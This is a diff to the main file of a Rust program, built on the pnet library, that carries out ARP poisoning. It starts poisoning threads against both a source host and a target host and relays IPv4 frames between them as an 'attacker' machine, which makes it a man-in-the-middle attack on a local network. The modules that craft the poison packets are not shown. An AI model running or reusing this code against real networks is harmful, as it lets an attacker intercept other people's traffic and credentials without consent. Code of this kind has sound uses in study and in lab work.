@@ -1,13 +1,14 @@
+use std::sync::{Arc, Mutex};
+
 use pnet::{
     datalink::{self, Channel::Ethernet},
     packet::ethernet::{EtherTypes, EthernetPacket},
 };
 
-use crate::parse_args::Args;
-use crate::{arp::handle_arp_packet, ipv4::handle_ipv4_packet};
+use crate::{forward_ipv4::forward_ipv4_packet, handle_arp::start_poison_thread, parse_args::Args};
 
-mod arp;
-mod ipv4;
+mod forward_ipv4;
+mod handle_arp;
 mod parse_args;
 
 fn main() {
@@ -17,14 +18,15 @@ fn main() {
     let interfaces = datalink::interfaces();
     let interface = interfaces
         .into_iter()
-        .find(|iface| iface.ips.iter().any(|ip| ip.ip() == args.ip_src))
-        .or_else(|| {
-            eprintln!("Error: No network interface found with the specified source IP address.");
-            std::process::exit(1);
-        })
-        .unwrap();
+        .find(|iface| iface.is_up() && !iface.is_loopback() && !iface.ips.is_empty())
+        .expect("No suitable network interface found");
 
-    let (mut tx, mut rx) = match datalink::channel(&interface, Default::default()) {
+    let attacker_mac = interface.mac.unwrap_or_else(|| {
+        eprintln!("Error while retrieving attacker mac");
+        std::process::exit(1);
+    });
+
+    let (tx, mut rx) = match datalink::channel(&interface, Default::default()) {
         Ok(Ethernet(tx, rx)) => (tx, rx),
         Ok(_) => {
             eprintln!("Error: Unsupported channel type");
@@ -36,27 +38,38 @@ fn main() {
         }
     };
 
+    let tx = Arc::new(Mutex::new(tx));
+
+    start_poison_thread(
+        tx.clone(),
+        attacker_mac,
+        args.ip_src,
+        args.mac_src,
+        args.ip_target,
+    );
+
+    start_poison_thread(
+        tx.clone(),
+        attacker_mac,
+        args.ip_target,
+        args.mac_target,
+        args.ip_src,
+    );
+
     loop {
-        let mut _buf = [0u8; 1500];
         match rx.next() {
             Ok(packet) => {
                 if let Some(eth) = EthernetPacket::new(packet) {
-                    match eth.get_ethertype() {
-                        EtherTypes::Arp => {
-                            handle_arp_packet(&eth, &args, &mut tx);
-                            continue;
+                    if eth.get_ethertype() == EtherTypes::Ipv4 {
+                        if eth.get_source() == args.mac_src {
+                            forward_ipv4_packet(&eth, tx.clone(), attacker_mac, args.mac_target);
+                        } else if eth.get_source() == args.mac_target {
+                            forward_ipv4_packet(&eth, tx.clone(), attacker_mac, args.mac_src);
                         }
-                        EtherTypes::Ipv4 => {
-                            handle_ipv4_packet(&eth, &args, &mut tx);
-                            continue;
-                        }
-                        _ => (),
                     }
                 }
             }
-            Err(e) => {
-                eprintln!("Error receiving packet: {e}");
-            }
+            Err(e) => eprintln!("rx error: {e}"),
         }
     }
 }
